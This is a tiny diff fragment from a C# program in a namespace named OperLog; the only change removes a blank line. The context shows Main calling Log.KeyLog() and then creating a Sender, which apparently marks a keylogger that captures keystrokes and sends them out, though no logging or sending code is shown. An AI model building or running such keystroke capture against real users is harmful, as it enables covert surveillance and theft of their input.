@@ -10,7 +10,6 @@ namespace OperLog
 {
     class Program
     {
-
         static void Main(String[] args) {
             Log.KeyLog();
             Sender s = new Sender();
